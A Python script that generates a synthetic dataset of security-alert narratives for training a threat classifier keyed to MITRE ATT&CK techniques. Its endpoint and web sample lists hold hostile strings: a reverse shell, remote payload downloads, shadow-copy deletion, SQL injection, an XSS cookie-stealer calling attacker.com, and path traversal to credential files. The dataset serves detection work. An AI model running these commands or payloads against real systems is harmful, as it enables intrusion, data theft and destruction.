import os
import json
import random
import pandas as pd
import numpy as np

# Set deterministic seed for reproducibility
random.seed(42)
np.random.seed(42)

# Label Mapping Dictionary
LABEL_MAPPING = {
    0: {"name": "Benign / Normal Operations", "mitre": "None", "modality": "Normal"},
    1: {"name": "T1498: Network Denial of Service", "mitre": "T1498", "modality": "Network"},
    2: {"name": "T1110: Brute Force & Credential Access", "mitre": "T1110", "modality": "Auth"},
    3: {"name": "T1059: Command and Scripting Interpreter", "mitre": "T1059", "modality": "Endpoint"},
    4: {"name": "T1190: Exploit Public-Facing Application", "mitre": "T1190", "modality": "Web"},
    5: {"name": "T1098: Account Manipulation & Privilege Escalation", "mitre": "T1098", "modality": "Cloud"}
}

def generate_benign_samples(n=1000):
    """Generates realistic normal enterprise operations text."""
    samples = []
    
    users = ["alice_smith", "bob_martinez", "carol_ops", "dev_jenkins", "sys_backup", "finance_user01", "m_clark", "s_kumar"]
    ports = [80, 443, 53, 123, 8080, 8443, 9092]
    services = ["Kerberos", "Okta SSO", "Active Directory LDAP", "Google Workspace SAML", "SSH"]
    hosts = ["MAC-DEV-04", "WIN-WORKSTATION-12", "UBUNTU-PROD-APP01", "LINUX-BUILD-SLAVE", "FIN-LAPTOP-09"]
    procs = ["svchost.exe", "explorer.exe", "slack", "chrome.exe", "code", "python3", "docker", "node", "git"]
    endpoints = ["/index.html", "/api/v1/health", "/static/bundle.js", "/dashboard/metrics", "/favicon.ico", "/users/profile", "/assets/logo.png"]
    cloud_events = ["DescribeInstances", "ListBuckets", "GetCallerIdentity", "DescribeVpcs", "GetMetricData", "ListQueues"]
    
    templates = [
        "Normal TCP TLS session established on destination port {port} with {fwd} forward packets and {bwd} backward packets over standard connection duration.",
        "Successful user authentication for corporate account '{user}' via standard {svc} provider during business hours from internal subnet 10.0.{s}.{h}.",
        "Routine background host process '{proc}' executed on {host} spawned by authorized parent process performing standard tasks.",
        "Legitimate HTTP GET request for static asset '{ep}' returning HTTP status code 200 with normal payload length {sz} bytes.",
        "Standard CloudTrail audit log: routine '{ev}' API call initiated by authorized EC2 autoscaling service role in us-east-1.",
        "DNS resolution query for corporate domain 'auth.corp.internal' on port 53 resolved successfully with 0 dropped packets.",
        "Periodic internal health check HTTP GET request against '/api/v1/health' returned 200 OK across cluster gateway.",
        "Scheduled nightly database archive script executed by user '{user}' transferring backup chunk of {sz} MB to approved internal NAS.",
        "Standard outbound HTTPS session on port 443 transmitting {sz} bytes to verified SaaS partner endpoint with valid TLS certificate.",
        "Authorized administrative SSH connection established by '{user}' to internal bastion host {host} with valid Ed25519 public key."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        text = tmpl.format(
            port=random.choice(ports),
            fwd=random.randint(4, 35),
            bwd=random.randint(4, 40),
            user=random.choice(users),
            svc=random.choice(services),
            s=random.randint(1, 50),
            h=random.randint(10, 250),
            proc=random.choice(procs),
            host=random.choice(hosts),
            ep=random.choice(endpoints),
            sz=random.randint(120, 4800),
            ev=random.choice(cloud_events)
        )
        samples.append({"text": text, "label": 0, "class_name": LABEL_MAPPING[0]["name"], "mitre_id": "None"})
    return samples

def generate_dos_samples(n=1000):
    """Generates T1498 Denial of Service network flow narrative descriptions."""
    samples = []
    ports = [80, 443, 53, 8080, 8443, 3389, 22]
    protos = ["TCP", "UDP", "ICMP"]
    templates = [
        "Anomalous {proto} network flow targeting destination port {port} (duration: {dur}µs, fwd_pkts: {fwd}, bwd_pkts: {bwd}) exhibiting volumetric spike signatures indicative of high-rate SYN flood resource exhaustion.",
        "Severe volumetric packet flood inundation targeting ingress gateway on port {port}. Connection transmitted {fwd} forward packets in {dur}µs with minimal response packets, characteristic of distributed denial of service.",
        "Anomalous asymmetric UDP reflection flood targeting port {port} with {fwd} packets exceeding standard bandwidth baseline by 850%.",
        "High-frequency TCP connection storm targeting destination port {port} with {fwd} packets in {dur}µs, overwhelming edge socket connection queues.",
        "Detected volumetric network denial of service: anomalous packet inundation targeting port {port} (duration: {dur}µs, packets: {fwd}) causing socket state table starvation.",
        "Persistent Slowloris partial HTTP header flood targeting web gateway port {port} across {fwd} lingering incomplete requests holding open server threads.",
        "High-volume ICMP echo request flood targeting external firewall interface with {fwd} packets, saturating ingress link capacity."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        text = tmpl.format(
            proto=random.choice(protos),
            port=random.choice(ports),
            dur=random.randint(12000, 180000),
            fwd=random.randint(2500, 25000),
            bwd=random.randint(0, 5)
        )
        samples.append({"text": text, "label": 1, "class_name": LABEL_MAPPING[1]["name"], "mitre_id": "T1498"})
    return samples

def generate_bruteforce_samples(n=1000):
    """Generates T1110 Brute Force & Credential Access narrative descriptions."""
    samples = []
    users = ["admin", "root", "administrator", "service_account", "svc_sql", "finance_lead", "dev_deployer", "vpn_user01"]
    svcs = ["SSH", "RDP", "Kerberos", "Okta Identity", "FTP", "LDAP Directory", "AWS Console SSO"]
    templates = [
        "Authentication anomaly on {svc} for account '{user}': {fails} consecutive failed login attempts at velocity {velo} req/min with MFA challenge rejection.",
        "Distributed credential stuffing campaign observed against {svc}: account '{user}' experienced {fails} rapid authentication failures originating from rotating public proxy subnets.",
        "High-velocity SSH password spray targeting account '{user}': {fails} authentication failures detected within 60 seconds from external IP cluster.",
        "IAM anomaly: Account '{user}' triggered {fails} invalid password attempts during off-hours with repeated MFA push fatigue notifications rejected by user.",
        "Kerberos Pre-Authentication failure spike targeting privileged domain account '{user}' with {fails} incorrect ticket requests, indicative of AS-REP roasting brute force.",
        "RDP endpoint authentication brute force on port 3389 targeting local user '{user}' with {fails} rapid dictionary attempts over 3 minutes."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        text = tmpl.format(
            svc=random.choice(svcs),
            user=random.choice(users),
            fails=random.randint(8, 65),
            velo=round(random.uniform(12.0, 55.0), 1)
        )
        samples.append({"text": text, "label": 2, "class_name": LABEL_MAPPING[2]["name"], "mitre_id": "T1110"})
    return samples

def generate_endpoint_samples(n=1000):
    """Generates T1059 Command and Scripting Interpreter host execution narratives."""
    samples = []
    hosts = ["MAC-EDGE-01", "WIN-PROD-SRV02", "WS-FINANCE-04", "UBUNTU-K8S-WORKER", "DC-CORP-PRIMARY"]
    commands = [
        ("powershell.exe", "word.exe", "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgA..."),
        ("cmd.exe", "excel.exe", "cmd.exe /c certutil.exe -urlcache -split -f http://malicious.cdn/payload.exe payload.exe"),
        ("wmic.exe", "powershell.exe", "wmic process call create 'powershell.exe -enc aW1wb3J0...'"),
        ("powershell.exe", "explorer.exe", "powershell.exe -nop -w hidden -c (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon')"),
        ("bash", "apache2", "bash -i >& /dev/tcp/198.51.100.22/4444 0>&1"),
        ("vssadmin.exe", "cmd.exe", "vssadmin.exe delete shadows /all /quiet"),
        ("rundll32.exe", "cmd.exe", "rundll32.exe C:\\Windows\\Temp\\inject.dll,DllRegisterServer"),
        ("whoami.exe", "winword.exe", "whoami.exe /priv /all")
    ]
    
    templates = [
        "Suspicious host execution on {host}: process '{proc}' spawned by '{parent}' executing anomalous commandline [{cmd}].",
        "Living-off-the-land binary execution detected on {host}: '{proc}' launched with high-entropy arguments [{cmd}] by unusual parent '{parent}'.",
        "Host compromise indicator on {host}: unauthorized child process '{proc}' invoked by '{parent}' with commandline [{cmd}] attempting privilege evaluation.",
        "Anomalous script interpreter execution: {host} detected unexpected process '{proc}' spawned from '{parent}' executing base64 obfuscated payload [{cmd}]."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        proc, parent, cmd = random.choice(commands)
        text = tmpl.format(
            host=random.choice(hosts),
            proc=proc,
            parent=parent,
            cmd=cmd
        )
        samples.append({"text": text, "label": 3, "class_name": LABEL_MAPPING[3]["name"], "mitre_id": "T1059"})
    return samples

def generate_web_samples(n=1000):
    """Generates T1190 Exploit Public-Facing Application web exploit narratives."""
    samples = []
    uris = [
        "/api/v1/auth/login?user=admin' OR '1'='1'--",
        "/search?q=1 UNION SELECT null,username,password_hash FROM users--",
        "/items?id=105; DROP TABLE orders;--",
        "/comment/submit?body=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
        "/profile/avatar?url=javascript:alert(document.domain)",
        "/download?file=../../../../../../etc/passwd",
        "/admin/logs?file=..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe",
        "/cgi-bin/test.cgi?cmd=;cat /etc/shadow;",
        "/api/v2/orders?query=%27%20UNION%20ALL%20SELECT%201,version(),user()%23"
    ]
    methods = ["POST", "GET", "PUT"]
    statuses = [500, 403, 200, 400]
    
    templates = [
        "Web application exploit attempt via HTTP {method} {uri} (status: {status}) exhibiting irregular payload syntax indicative of SQL injection.",
        "Ingress WAF alert: Cross-Site Scripting (XSS) payload detected via HTTP {method} request targeting {uri} with status code {status}.",
        "Path traversal attack observed against web application gateway: HTTP {method} request for {uri} attempting unauthorized file system access.",
        "Remote code execution probe detected on public API: HTTP {method} {uri} containing command separator tokens resulting in HTTP status {status}.",
        "Web application exploit attempt: Malformed user input submitted via {method} to {uri} triggering backend database syntax error exception (status: {status})."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        text = tmpl.format(
            method=random.choice(methods),
            uri=random.choice(uris),
            status=random.choice(statuses)
        )
        samples.append({"text": text, "label": 4, "class_name": LABEL_MAPPING[4]["name"], "mitre_id": "T1190"})
    return samples

def generate_cloud_samples(n=1000):
    """Generates T1098 Account Manipulation & Cloud Privilege Escalation narratives."""
    samples = []
    events = [
        ("CreateAccessKey", "iam.amazonaws.com", "Privilege Escalation"),
        ("AttachUserPolicy", "iam.amazonaws.com", "Privilege Escalation"),
        ("AttachRolePolicy", "iam.amazonaws.com", "Privilege Escalation"),
        ("PutUserPolicy", "iam.amazonaws.com", "Privilege Escalation"),
        ("CreateLoginProfile", "iam.amazonaws.com", "Persistence"),
        ("PutBucketPolicy", "s3.amazonaws.com", "Data Exposure"),
        ("AssumeRole", "sts.amazonaws.com", "Lateral Movement"),
        ("GetAccountSummary", "iam.amazonaws.com", "Reconnaissance")
    ]
    ips = ["185.220.101.5", "198.51.100.89", "203.0.113.44", "45.154.255.10", "194.26.29.112"]
    
    templates = [
        "Cloud control-plane anomaly: {category} invocation '{ev}' against {source} from external untrusted client IP {ip}.",
        "AWS CloudTrail security alert: unauthorized API call '{ev}' executed against {source} by external principal {ip} resulting in AccessDenied.",
        "Privilege escalation indicator: API call '{ev}' invoked on {source} creating administrative backdoors from suspicious external origin {ip}.",
        "Cloud IAM anomaly: burst of high-velocity reconnaissance and credential modification calls including '{ev}' from external proxy {ip} targeting core identity policies."
    ]
    
    for _ in range(n):
        tmpl = random.choice(templates)
        ev, source, cat = random.choice(events)
        text = tmpl.format(
            category=cat,
            ev=ev,
            source=source,
            ip=random.choice(ips)
        )
        samples.append({"text": text, "label": 5, "class_name": LABEL_MAPPING[5]["name"], "mitre_id": "T1098"})
    return samples

def build_complete_dataset(samples_per_class=1000):
    """Assembles all 6 classes into a shuffled DataFrame and exports to CSV & JSON."""
    print("=" * 65)
    print("🚀 GENERATING CALIBRATED MULTI-CLASS CTI NARRATIVE DATASET 🚀")
    print("=" * 65)
    
    all_records = []
    all_records.extend(generate_benign_samples(samples_per_class))
    all_records.extend(generate_dos_samples(samples_per_class))
    all_records.extend(generate_bruteforce_samples(samples_per_class))
    all_records.extend(generate_endpoint_samples(samples_per_class))
    all_records.extend(generate_web_samples(samples_per_class))
    all_records.extend(generate_cloud_samples(samples_per_class))
    
    df = pd.DataFrame(all_records)
    
    # Shuffle dataset
    df = df.sample(frac=1.0, random_state=42).reset_index(drop=True)
    
    # Export paths
    output_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "client", "data"))
    os.makedirs(output_dir, exist_ok=True)
    csv_path = os.path.join(output_dir, "cti_narratives_dataset.csv")
    json_path = os.path.join(output_dir, "cti_narratives_dataset.json")
    
    df.to_csv(csv_path, index=False)
    with open(json_path, "w") as f:
        json.dump(all_records, f, indent=2)
        
    print(f"\n✅ Total Samples Generated: {len(df):,}")
    print(f"📁 CSV Exported to:  {csv_path}")
    print(f"📁 JSON Exported to: {json_path}")
    
    print("\n--- CLASS DISTRIBUTION SUMMARY ---")
    summary = df.groupby(["label", "class_name", "mitre_id"]).size().reset_index(name="count")
    print(summary.to_string(index=False))
    
    print("\n--- SAMPLE RECORDS (FIRST 3 SHUFFLED ENTRIES) ---")
    for i, row in df.head(3).iterrows():
        print(f"\n[Sample {i+1}] Class {row['label']} ({row['class_name']}):")
        print(f"  \"{row['text']}\"")
        
    print("=" * 65)
    return df

if __name__ == "__main__":
    build_complete_dataset(samples_per_class=1000)

